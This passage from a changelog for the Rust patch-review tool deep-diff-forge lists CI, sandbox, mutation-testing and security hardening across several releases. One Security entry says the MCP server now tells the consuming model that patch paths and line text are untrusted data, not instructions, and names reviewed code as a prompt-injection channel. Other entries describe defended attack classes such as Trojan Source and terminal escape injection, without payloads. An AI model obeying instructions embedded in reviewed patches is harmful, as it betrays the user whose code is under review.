- **The daemon client reads a complete response on macOS** when the daemon
  closes first, and gates never fall back to running as root where `/proc` is
  missing (found by the first macOS test runs).
- **No trust policy trusts a strategy with no receipts**, even with
  `min_samples: 0`.
- **The Python `SocketClient` raises `TransportError`** for a missing socket, a
  refused connection or a timeout, as documented, not a bare `OSError`.
- **The README's daemon section** lists all ten methods and protocol 1, under a
  test.

- **Antipattern rows record what enforces them** (anchor B-10). A catalogue
  row may carry a DDF-owned `ddf_enforcement` claim beside its verbatim import
  labels; the policy checker accepts it only when every piece of evidence
  resolves against parsed configuration (a workspace lint at `deny`, a path
  in `clippy.toml`'s `disallowed-methods`), and its report lists the enforced
  rows. AP-17 (unreviewed lint suppression, B-03) and AP-06 (policy coupled to
  clock or host, B-04, with its scope stated) are the first two.
- **Every pull request is mutation-tested on its changed lines** (anchor
  B-01). A new four-shard `diff mutation` job runs `scripts/diff_mutation.sh`,
  which mutates the Rust lines the pull request changes since its merge base
  (`cargo mutants --in-diff`) and fails on any missed mutant or timeout. A
  change with no Rust lines under `crates/` passes and says so. Before, CI
  mutated two functions of the review crate, and "0 missed on every diff" was
  held by habit.
- **The local CI replica and pre-push hook are versioned** (anchor B-07).
  `scripts/ci_local.sh` replicates every step of the CI gate jobs and fails
  closed; each step is labelled with the CI step it replicates, and
  `tests/ci_replica.rs` fails when a CI step has no replica step or a replica
  step names no CI step. `just ci` runs it (before, `just ci` was the feature
  gate alone, without docs, deny, audit, SBOM, MSRV, soak, probes, the SDK test
  or the fuzz compile). The gitleaks pre-push hook is `scripts/hooks/pre-push`;
  `just install-hooks` installs it and `just doctor` reports whether it is
  installed.
- **CI runs weekly** (anchor B-11). A `schedule:` trigger (Monday 04:23 UTC)
  runs the full workflow, so a new RustSec advisory or a yanked dependency
  fails within a week even when nothing is merged.
- **The crate graph is a committed table** (anchor B-05).
  `docs/crate-edges.txt` lists every edge between workspace crates (normal,
  dev and target-specific kept apart), and `tests/crate_edges.rs` compares it
  with `cargo metadata`: a new dependency between workspace crates fails until
  the table is changed in a reviewed diff, and a row no `Cargo.toml` declares
  fails as stale.
- **Effects go through named doors** (anchor B-04). A new `clippy.toml`
  disallows `Command::new`, `env::var`/`var_os`, `Instant::now`,
  `SystemTime::now` and `thread::sleep`. The 21 functions that legitimately
  spawn, read the environment or read a clock each carry
  `#[expect(clippy::disallowed_methods, reason = "<door>")]` naming the door,
  and the 20 integration-test files that drive real processes opt in once at
  the top. A new effect anywhere else no longer passes clippy.
- **MCP `review_patch` returns a bounded summary for large reviews** (anchor
  A-07; Luke's decision). The full document is returned while it is at most
  256 KiB; a larger one comes back as `deep-diff-forge.review-summary.v0` (the
  same seal and totals, per-file counts for up to 1,000 files, `reason`,
  `omitted_files`). `paths` returns chosen files in full and `detail: "summary"`
  asks for the summary. A 30 MB patch now answers in 181 KB instead of one
  178 MB line.
- **Review council** (`council prepare|status|review|gate`) — six default
  reviewer slots across Claude Code and Codex, independent then challenge
  rounds, controller admission that rejects fabricated citations, and `HOLD`
  (exit 7) for missing evidence. See `docs/REVIEW_COUNCIL.md`.
- **Gate sandbox** — the eight evidence gates (format, check, clippy, pedantic,
  tests, antipatterns, fuzz, mutation) run on a sealed snapshot in a rootless
  Podman container: image by ID, `--network=none` except dependency vendoring,
  read-only root and source, all capabilities dropped, `--userns=keep-id`. A
  real-Podman planted-breach suite (12 probes) guards it.
- **Diff-scoped mutation gate** — cargo-mutants 27.1.0 `--no-config --in-diff`
  against a scope diff built from verified base and candidate blobs
  (`mutation_scope`, `mutation_base`), 300 s per mutant, 4 jobs.
- **Exemption oracle** (`policy/exemption_oracle.py`, schema v7) — run before
  the mutation job; only `#[cfg(test)]` may hide code from mutation, and that
  code must leave every workspace member's non-test MIR unchanged in the gate
  and release builds. Anything else hidden is refused with no builds.
- **Git acquisition** (P1a) — `--git-working-tree [--include-untracked]`,
  `--git-staged`, `--git-range A..B`, `--repo`, `--acquisition-json`
  (`deep-diff-forge.git-acquisition.v0`).
- **`council import-tuicr`** decision journal (P1c, DDF-R18) — appends tuicr
  dispositions to an append-only `<run>/decisions.jsonl`; dry run by default.

- **`council export-tuicr`** (DDF-R54) — files controller-admitted council
  findings into a local tuicr 1.3 session as local draft notes. Dry run by
  default; `--execute` writes through `tuicr review add` with fixed argv.
  Refuses tampered reports, forge sessions, a different repository and, unless
  `--allow-review-level` is given, findings whose cited bytes in the session's
  revision differ from the run's sealed snapshot. A create-new ledger in the
  run makes re-runs no-ops. See `docs/REVIEW_COUNCIL.md#tuicr-export`.
- **Input sealing** — every input-derived machine document (`review.v0`,
  `rank.v0`, `cluster.v0`, `semantic.v0`) now carries two additive top-level
  members directly after `schema`: `input_sha256` (lowercase hex SHA-256 over
  the exact bytes read, before any parsing or normalisation) and `tool`
  (`{"name": "deep-diff-forge", "version": …}`). An orchestrator can tie a
  verdict to exact input bytes and an exact tool build. Schema names are
  unchanged (`.v0`): the fields are purely additive. SHA-256 is implemented in
  `deep-diff-forge-core` (`sha256`, `sha256_hex`, `InputSeal`) in pure safe Rust
  with no new dependency, tested against the NIST vectors;
  `deep-diff-forge-patch` gains `to_json_sealed`.
- **`--require-files`** for `--stdin-patch` — refuse a patch that parses to 0
  files with the new **exit code 7**, an empty stdout, and
  `refused: 0 files in input (--require-files)` on stderr. Gates should always
  pass it so an empty or mis-piped input is never read as a clean review.
  Default behaviour without the flag (0 files → exit 0) is unchanged.
- **`--require-hunks`** for `--stdin-patch` — closes the gap `--require-files`
  leaves open: a header-only (`diff --git a/x b/x`) or rename-only diff parses
  to one file with 0 hunks and passed the files guard with exit 0. The new
  guard refuses a patch with 0 hunks or 0 added+removed lines across all files
  (header-only, rename-only, context-only hunks) with the same **exit code 7**,
  an empty stdout, and `refused: 0 hunks in input (--require-hunks)` on stderr.
  A gate should pass **both** flags; when both would fail, the files guard
  reports first. Default behaviour without the flag is unchanged.
- Determinism contract test: `--rank --json --require-files` is byte-identical
  across runs with an identical `input_sha256`.
- **Stdio server fuzz targets** — `stdio_mcp` and `stdio_rpc` compile the
  CLI's `mcp.rs` and `rpc.rs` into the fuzz crate and drive their stdio
  loops in process, at the real cap or a small one. They assert one JSON-RPC
  2.0 object per output line, exactly one of `result`/`error`, and at most one
  answer per input line. CI runs a 10 s instrumented smoke from
  `fuzz/seeds/`.

- **`learn` is tested end to end** (anchor A-08, from Parking). Recording a
  receipt, reading the count back, the default `status` subcommand, and the
  refusals (a path in place of the redacted id, a self-contradicting receipt,
  an unknown subcommand, `record` without `--stdin`) now run against the
  binary in an isolated `XDG_STATE_HOME`. Before, replacing `learn_cmd` with a
  no-op survived mutation.
- **A self-contradicting learning receipt is refused** (anchor C-11). A
  receipt whose outcome is `revisited` but whose `revisited` flag is false is
  refused on append and on load, so scoring cannot count the revisit in one
  rate and not the other.
- **Contradicted facts corrected** (anchor E-02). `--help` no longer lists
  shipped commands (`review`, `daemon start`, the `--git-*` family) as future
  modes; its "not yet implemented" list is checked to be refused. The
  crates.io publish loop in `release.yml` now includes `sdk`, and a test keeps
  it naming every workspace crate after its dependencies. The API doc states
  protocol 1, the release doc describes per-archive SHA-256 files and
  attestations (no signed `checksums.txt`), and the feature matrix marks the
  options that do not exist.
- **An unmeasured test no longer shows as passed** (anchor B-08). The
  real-Podman sandbox test and the two real-tuicr tests printed `UNMEASURED`
  and returned, so `cargo test` reported them `ok`. They are now `#[ignore]`d
  with the command that runs them, and an explicit `--ignored` run without
  their environment fails; CI runs the sandbox test with `--ignored`.
- **Lint suppressions carry a reason and cannot go stale** (anchor B-03). The
  nine workspace `#[allow]` sites (and two in the fuzz targets) are now
  `#[expect(.., reason = "..")]`, and clippy's `allow_attributes` and
  `allow_attributes_without_reason` are denied in the workspace and fuzz
  manifests: a bare `#[allow]` no longer builds, and an expectation whose lint
  stops firing fails as unfulfilled.
- **Code-literal scans cover every source file** (anchor B-02). The exit-code
  scan read a hard-coded list of five files and stopped at the first
  `#[cfg(test)]`, which hid the production code after a mid-file test item
  (`core/src/lib.rs` from line 128, `daemon/src/serve.rs` from 181). It now
  walks every `crates/*/src` file, skips each test item on its own, and also
  catches bare `exit(N)`, `ExitCode::from(N)` and `code: N`. A new scan refuses
  JSON-RPC error-code literals outside their named constants; the MCP server's
  six `-32600` and the SDK's daemon codes `4` and `7` now use the constants.
- **One status vocabulary** (anchor D-01). The JSON, JSONL and projection label
  tables are replaced by `FileStatus::label`, and the human summary no longer
  prints `{:?}` (it printed `binarychanged` and `typechanged` where every other
  surface prints `binary_changed` and `type_changed`).
- **Syntax analysis no longer depends on machine load** (anchor A-04). The
  flat 250 ms parse deadline made one 220 KB Rust file come out complete in 9
  and timed out in 55 of 64 parallel runs, and timed out every 1 MB file even
  on an idle machine. The deadline is now a backstop of 1 s plus 5 ms per KiB,
  about seventeen times the measured linear parse rate at every size: under a
  load average of 33–39, 64 parallel runs of 220 KB, 1 MB and 1.9 MB inputs
  gave one result each. Hostile input is still cut (a 455 KiB token soup that
  ran for 125 s now stops at about 3 s). Counting tree-sitter progress
  callbacks was measured and rejected: that input made fewer callbacks per KiB
  than ordinary code.
- **The daemon recovers fully from a contained panic** (anchor A-03). It used
  to keep answering through the poisoned engine lock while each connection loop
  read the poison as "not running", so after one panic every connection got a
  single answer and was dropped. The sessions the panic may have left
  inconsistent are now cleared (`Engine::reset_sessions`; the pid, start time
  and session-id counter are kept) and the poison is cleared, so the
  connection and later ones are served as before.
- **Every fuzz target runs in CI** (anchor B-06). `patch_parser`,
  `review_json`, `daemon_protocol` and `agent_annotation` only ever compiled;
  the instrumented smoke now runs all seven targets for 10 s each and refuses a
  `fuzz/Cargo.toml` target that the step does not run. New seeds for
  `daemon_protocol` and `agent_annotation`; Dependabot now watches `/fuzz`.
- **Unknown options are refused, not ignored** (anchor A-01). Every entry point
  admits its arguments against a closed set (`cli/src/args.rs`) and exits 2,
  naming the option, with an empty stdout. Before, a misspelt guard such as
  `--require-file` was silently skipped, so a gate passed every empty patch
  with exit 0. Commands that take no arguments (`doctor`, `--version`, the
  `*-contract` printers) and `schema` now refuse extra ones too. A test ties
  every option in `--help` to an invocation that admits it.
- **A non-UTF-8 line no longer refuses the whole review** (anchor C-12).
  Real repositories commit non-UTF-8 content (Latin-1 sources, fuzz corpora):
  2 of 33 HEE v5 commits, and DDF's own merge #11 (binary fuzz seeds), failed
  with exit 3. Now `patch::decode` keeps valid lines byte-exact and decodes an
  invalid line lossily (U+FFFD); the parser marks only that line's file
  (`PatchTwin::lossy_lines`, shown as `"lossy_lines": N` in the review JSON and
  JSONL, and in the human summary), and every seal covers the exact input
  bytes (`seal_of` takes bytes; `CapturedPatch::capture_bytes`,
  `original_bytes`, `is_exact`). Output for UTF-8 input is byte-identical. A
  non-UTF-8 *path* is still refused, because a path is an identity.
  `GitAcquireError::NonUtf8Patch` is removed.
- **The review JSON records which side lacks a final newline** (anchor A-06).
  A line carries `"no_newline": true` when the marker follows it; its `kind`
  names the side (removed: old, added: new, context: both). Before, patches
  that differed only in which side lacked the newline produced identical JSON,
  although git applies one and refuses the other. Other output is unchanged.
- **The learning store validates records on load** (anchor A-05). A hand-edited
  line holding a path (or a path-like token) is refused, naming its line; before,
  only `append_receipt` applied the privacy checks.
- Non-Unix `path_from_bytes` (`deep-diff-forge-patch`) reuses valid UTF-8
  without a copy, which clears `clippy::needless_pass_by_value` in a
  Windows-target pedantic build.
- **main's red CI** (failing since 2026-06, run 37532439196): a floating
  `stable` toolchain deprecated `fetch_update` under `-D warnings`; `cargo deny`
  was called without being installed; the SBOM `documentNamespace` embedded
  wall-clock time. The namespace is now content-addressed and `created` comes
  from `SOURCE_DATE_EPOCH` or the last `Cargo.lock` commit, so regenerations are
  byte-identical. main CI is green at run 40274253094.
- **Sandbox worked only for uid 1000**: gate containers ran as the image's
  `USER 1000`, so an operator with another uid (1001 on GitHub runners) could
  not read the private source copy. Containers now run as
  `--user=<uid>:<gid>` read from `/proc/self`.
- **Probe verdict race**: parallel probe tests could write a verdict mid-line
  after libtest's `test name ... `, losing it (main run 40268250417). Verdicts
  now start with a newline and are parsed anywhere in a line.
- **`mutation_scope` emitted touching hunks** (latent since r10): a widened
  pure insertion could start on the line the previous hunk ended on, and
  cargo-mutants rejected the diff. Regions now merge on touching; property
  tests assert header ordering. Surfaced by council r17.
- The oracle removes its build trees on exit (they filled `/tmp`).
- `council_report` fuzz target builds again after the `mutation_diff_sha256`
  field.

### Security

- **No text change can hide behind a binary patch body.** After
  `GIT binary patch`, every later line was taken as binary data, so a crafted
  patch was reviewed as one binary file while `git apply` also changed a text
  file. The body now takes only the lines of git's binary grammar; such a patch
  is refused (exit 4).
- **Ids become paths only as checked segments** (anchor C-09). Every reviewer,
  job, session and fuzz-target id joined into a council run directory now goes
  through one check (`segment`, `job_dir`, `report_path`) at the join, so a
  path cannot leave the run directory even where the id was not validated
  first; before, the joins relied on `identifier()` having been called
  earlier.
- **MCP marks patch text as untrusted for the consuming model** (anchor E-07).
  The server instructions and the `review_patch` / `rank_patch` descriptions
  say that paths and line text come from the patch, whose authors wrote them,
  and are data to review, never instructions. Reviewed code and comments are
  an injection channel into a model's context; nothing said so before.
- **One hardened Git door** (anchor A-02). Git acquisition (`patch`) and
  council storage (`review`) now apply the same set from
  `deep_diff_forge_core::git`: no optional locks, replacement refs, fsmonitor,
  hooks, external diff or transports (`protocol.allow=never`,
  `GIT_NO_LAZY_FETCH`), and every inherited variable that would point Git at
  another repository removed. Measured before: `--git-range` in a partial clone
  ran `git fetch origin` against the promisor remote (a network effect from a
  read-only command); council storage honoured an inherited `GIT_DIR`, so
  `rev-parse HEAD` named another repository while the top-level check passed.
  A partial clone's missing blob is now an error, not a fetch.
- Council gates never fall back to the host: a missing gate image or a failed
  dependency-vendoring job is a refusal. Vendored dependencies are sealed and
  re-measured before each gate; base Git objects are verified on read.
- The mutation gate ignores the candidate's cargo-mutants config, and code
  hidden from mutation by anything other than `#[cfg(test)]` is refused.

## [0.2.1] - 2026-09-04

### Security

- Hardened the Unix daemon against symlink/inode-swap attacks, slowloris and
  stalled-reader clients, unbounded worker creation, oversized responses, and
  multi-session memory exhaustion. JSON-RPC fields are now shape-validated.
- Added a structural patch line budget and strict size/line/count, ownership,
  permission, and pseudonymous-identifier validation to the learning store.
- Upgraded Ratatui/Crossterm so the dependency graph uses patched `lru` 0.18.4
  and removed all RustSec advisory waivers.
- Restricted release publication to version-matching tags, stopped persisting
  checkout credentials, pinned the audit tool, and made the publish version
  derive from the workspace manifest. The separate fuzz dependency graph now
  passes the same advisory, license, source, and wildcard-dependency policy;
  CI/release concurrency and dependency-update cooldowns are explicit.

[0.2.1]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.2.1

## [0.2.0] - 2026-06-23

The **L9 (Learning)** layer plus the first crates.io-publishable cut, a
supply-chain & fuzz hardening pass, and the interactive **review cockpit** (ranked
tree, multi-file diff, inline agent notes, command palette, colour themes, mouse)
— 12 crates, 927 tests, zero `unsafe`, supply-chain-gated. `cargo publish
--dry-run` is clean across the workspace; the crates.io upload itself remains
token-gated.

### Added

- **Interactive review cockpit** — `review [--probe] [--side] [--palette | --cmd
  NAME]` (+ `deep-diff-forge-tui`, ratatui): a review-first terminal UI with a
  risk-ranked file tree, a multi-file diff pane, and the engine's own findings as
  inline grounded agent notes. Runtime view toggles for layout (inline ↔
  side-by-side), fold, line-wrap, and notes; a per-file **reviewed flag** (`v` /
  `Space`, auto-advancing, with a `viewed:n/total` progress indicator) for triage;
  three colour themes (`T`: dark · midnight · mono); a top menu bar and a `?`
  keybinding help card; and full **mouse** support (scroll, click-to-focus,
  sidebar selection, menu clicks). State is pure and headless-testable
  (`render_to_lines`); `--probe` renders one frame with no TTY for CI/agents.
- **Command palette** — `:` in-app, or headless via `review --palette` / `--cmd
  NAME`, runs any engine capability against the loaded review and shows it in a
  result panel: `rank`, `outline` (tree-sitter symbols of the changed regions),
  `cluster`, `summary`, `notes`, `review` (the `review.v0` JSON), live `daemon`
  health/status, `learning` scores, and the `maturity` ladder. In-process and
  read-only; never mutates patch truth.
- **`deploy release`** — `deploy release [--json]` (schema
  `deep-diff-forge.release.v0`): a declared per-target publication snapshot
  (GitHub, GitLab, GitHub release, crates.io) with a `pending` list; `crates.io`
  reports `blocked` until a registry token is configured.
- **Syntax highlighting** — `highlight <path> [--color|--no-color]` (+
  `syntax::highlight`): tree-sitter highlighting reusing the grammar's own
  `highlights.scm`, mapped to an ANSI palette. Colour auto-detects a TTY.
  Terminal-injection-safe: source text is routed through `display_safe`, so the
  only raw escapes are fixed SGR codes.
- **Structural diff** — `structural <old> <new> [--json]` (+
  `syntax::structural`, schema `deep-diff-forge.structural.v0`): a token/leaf-level
  (AST) diff over tree-sitter token streams. **Reformat-aware** (layout-only edits
  report zero structural change) with best-effort moved-block detection; never
  touches patch truth. Bounded LCS with graceful degradation on huge inputs.
- **Learning (L9)** — `deep-diff-forge-learning`: the local-only learning loop.
  Per-decision [`StrategyReceipt`]s (hashes/counts/timings — never a path or
  source line) are appended as JSONL under `$XDG_STATE_HOME/deep-diff-forge/
  learning/`, scored per strategy, and gated for promotion. Three learning units
  — planner (strategy + budget), ranking (risk weights), annotation (agent trust
  tiers, *untrusted until grounded*) — plus an explainable promotion gate. CLI
  `learn {status|record --stdin} [--json]`. 135 tests; never uploads, never
  mutates patch truth.

### Changed

- **Daemon socket handling** (Zen review) — replaced scattered `Option<PathBuf>`
  resolution with a parse-don't-validate `SocketLocation` type: one
  `SocketLocation::resolve(explicit)` entry point (explicit `--socket` → else
  `$XDG_RUNTIME_DIR` → else a typed `NoRuntimeDir`, no `/tmp` fallback), with
  `bind`/`connect`/`path` as methods. A "no location" state is unrepresentable
  past construction, and the CLI's nested `if let` collapses to one call.
- **Publishable-workspace manifests** — versions and internal deps are now
  inherited via `[workspace.package]` + `[workspace.dependencies]`; every crate
  carries `description`, `keywords`, `categories`, and `homepage`. `core` and
  `cli` gained the `description` that `cargo publish` requires.

### Fixed

- **Patch truth: malformed/truncated hunks are now rejected** (Zen review) — the
  parser enforces each hunk's declared `@@ -a,b +c,d @@` counts exactly. A hunk
  that ends (at a new header, a new file, or EOF) before its counts are satisfied
  is a `TruncatedHunk` error; a body line that over-fills a side is a
  `HunkLineCountMismatch`. An internally-incoherent patch no longer parses as
  apply-able truth.
- **Broken-pipe handling** — bulk CLI output (`--stdin-patch`, `--rank`,
  `--cluster`, `--jsonl`, `semantic`, `review --probe`, `learn`) is routed
  through a broken-pipe-tolerant writer, so `deep-diff-forge … | head` exits `0`
  instead of panicking with `EPIPE` (exit 101). Resolves the L1-era open finding;
  std-only, no `unsafe`.

### Security

Pre-publication adversarial hardening (S1008412): an 8-dimension STRIDE review
with independent verification produced a CVSS-scored register of 17 confirmed
findings (4 MEDIUM, 12 LOW, 1 INFO; **no Critical/High**), all remediated with
fail-before/pass-after regression tests. A later final-hardening review fleet
(5 reviewers + adversarial verify) added the items below. See `SECURITY.md`.

- **Trojan Source defence (CVE-2021-42574)** — `display_safe` now also escapes
  bidirectional/invisible Unicode (`U+202A–202E`, `U+2066–2069`, directional
  marks, zero-width, BOM) to a visible `\u{XXXX}`, so attacker source cannot
  display differently than it reads — on-mission for a review tool.
- **Cross-platform contract made honest** — the UDS daemon is Unix-only; it now
  emits a clear `compile_error!` on non-Unix instead of a cryptic `std::os::unix`
  failure, and the release matrix dropped its (un-buildable) Windows lane so CI
  and code agree before the irreversible publish (Linux + macOS).
- **Broken-pipe fix completed** — the remaining `deploy`/`doctor`/`--help`/
  contract commands (notably the `--json` outputs CI/agents pipe to `head`/`jq`)
  now route through the broken-pipe-tolerant writer; `… | head` exits `0`, not 101.
- **`structural` on a non-Rust file** now errors explicitly instead of silently
  reporting "formatting only"; **`doctor`** resolves both its runtime-dir and
  socket lines through the daemon's `var_os` resolver (consistent on non-UTF-8 env).
- **Terminal/ANSI-escape injection** — attacker-controlled diff bodies, file
  paths, and symbol names are now sanitized by `core::display_safe` (control
  chars escaped to a visible `\xHH`) at every human-render boundary; `json_escape`
  also neutralises `DEL` + the C1 block. A reviewer rendering a hostile patch can
  no longer have their terminal hijacked (screen clobber, scrollback forgery,
  OSC-52 clipboard write, title/hyperlink spoof).
- **Memory-exhaustion DoS** — stdin, source-file, and daemon request reads are
  hard-capped at the byte budget instead of buffering unbounded input.
- **Daemon robustness** — per-connection panic/error isolation (`catch_unwind`,
  no fatal `?`), a read timeout (slowloris), a size-bounded request line, symlink
  rejection, and **no world-writable `/tmp` socket fallback** (fails closed
  without `$XDG_RUNTIME_DIR`).
- **Fail-closed trust** — agent annotation `source` is no longer inferred from an
  attacker-controlled label; learning-store files are owner-private (`0700`/`0600`).
- **Supply chain** — `unsafe_code = "forbid"` is now compiler-enforced
  workspace-wide; `tree-sitter` is pinned to exact versions; a strict `cargo
  audit` gate runs in CI and gates the irreversible crates.io publish;
  least-privilege workflow permissions; Dependabot; `SECURITY.md`.

A second bias-controlled re-review (S1008443) raised three further findings, each
fixed and independently verified (security / tester / claim-verifier judges,
outside the build loop):

- **Mandatory hunk-header closer** — `parse_hunk_header` now requires the closing
  `@@` token; a header with trailing garbage and no closer (`@@ -1,1 +1,1
  NOT_A_HUNK`) is rejected (exit 4) instead of normalizing into a valid model.
  Completes the patch-truth hardening alongside the truncated-hunk fix.
- **Explicit `--socket` no longer mutates caller state** — `SocketLocation` carries
  provenance; an explicit `--socket` path binds via a fail-closed `bind_explicit`
  that **creates** an absent parent at `0700` but **never chmods a pre-existing
  parent** (a world-readable parent fails closed rather than being silently
  tightened to `0700`) and removes the socket path **only if it is verifiably a
  socket** (never a regular file, directory, or symlink). The engine-owned
  `$XDG_RUNTIME_DIR` path is unchanged, and `daemon start --socket /new/path` still
  works (the absent parent is created).
- **Bounded daemon sessions** — review sessions are capped at `MAX_SESSIONS` (64)
  with LRU eviction (least-recently-used evicted before insert; reads refresh
  recency), hard-bounding daemon memory regardless of how many sessions a client
  opens without closing.

A supply-chain & fuzz hardening pass then raised the release/CI posture:

- **GitHub Actions pinned to commit SHAs** across CI and release (tag-hijack
  defence); the release workflow now emits **SLSA build-provenance attestations**
  for the binary, its checksum, and the SBOM.
- **SPDX SBOM** (`sbom.spdx.json`) generated from `Cargo.lock`/`cargo metadata`,
  gated in CI and uploaded with each release.
- **Fuzz harness** (`fuzz/`, cargo-fuzz) — four targets (`patch_parser`,
  `review_json`, `daemon_protocol`, `agent_annotation`), excluded from the
  publishable workspace; a compile gate keeps it building in CI.
- **CI security probes** — a hostile-daemon soak, a learning-privacy probe, and a
  mutation-gate inventory, exposed as `just security-*` recipes.
- Added a JSON-RPC wire error-code regression test and empty-input
  `--json`/`--jsonl` stability tests. Corrected the daemon's `lib.rs` doc from
  "thread-per-connection" to the true single-threaded sequential accept loop.

[Unreleased]: https://github.com/Louranicas/deep-diff-forge/compare/v0.8.3...HEAD
[0.8.3]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.3
[0.8.2]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.2
[0.8.1]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.1
[0.8.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.0
[0.7.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.7.0
[0.6.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.6.0
[0.5.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.5.0
[0.4.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.4.0
[0.3.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.3.0
[0.2.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.2.0

## [0.1.0] - 2026-06-22

First tagged release. The complete diff/review engine (layers L1–L7,
Patch→Daemon) at deployment maturity **L8 (Release)** — 11 crates, 568 tests,
zero `unsafe`, supply-chain-gated.

### Added

- **Patch (L1)** — `deep-diff-forge-patch`: unified/Git patch parser, apply-able
  renderer, and `deep-diff-forge.review.v0` JSON. CLI `--stdin-patch [--json]`.
- **Projection (L2)** — `deep-diff-forge-projection`: renderer-neutral inline and
  side-by-side views. CLI `--layout inline|side-by-side`.
- **Pipeline (L3)** — `deep-diff-forge-pipeline`: composable Unix-filter stages
  (`ChainStage`) and JSONL streaming. CLI `--jsonl`.
- **Semantic (L4)** — `deep-diff-forge-syntax`: tree-sitter language detection,
  budgeted parsing, and symbol extraction (Rust). CLI `semantic <path> [--json]`.
- **Review (L5)** — `deep-diff-forge-graph` (Review Intelligence Graph,
  deterministic risk ranking; CLI `--rank`), `deep-diff-forge-agent` (annotation
  provenance, grounding, sanitization), and `deep-diff-forge-tui` (review TUI;
  CLI `review [--probe]`).
- **Cluster (L6)** — `deep-diff-forge-cluster`: bounded parallel dimensional
  execution with deterministic joins and receipts. CLI `--cluster [--parallel]`.
- **Daemon (L7)** — `deep-diff-forge-daemon`: optional UDS JSON-RPC service
  (std-first, owner-private sockets). CLI `daemon {path|start|health|status|stop}`.
- **Deployment surface** — `deploy status` and `deploy release` machine-readable
  reports (`deployment-status.v0`, `release.v0`); CI workflow; `deny.toml`
  supply-chain policy; release workflow (`release.yml`).

### Engineering

- Strictly acyclic 11-crate workspace; `core` is pure vocabulary.
- Patch truth is preserved across every layer (never mutated by enrichment).
- Each production crate carries at least 50 meaningful tests.
- Pedantic clippy clean; no production `unwrap`/`expect`; no `unsafe`.

### Not yet released

- **crates.io publication** is pending a registry token (the release workflow
  publishes automatically when `CARGO_REGISTRY_TOKEN` is configured).

[0.2.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.2.0
[0.1.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.1.0
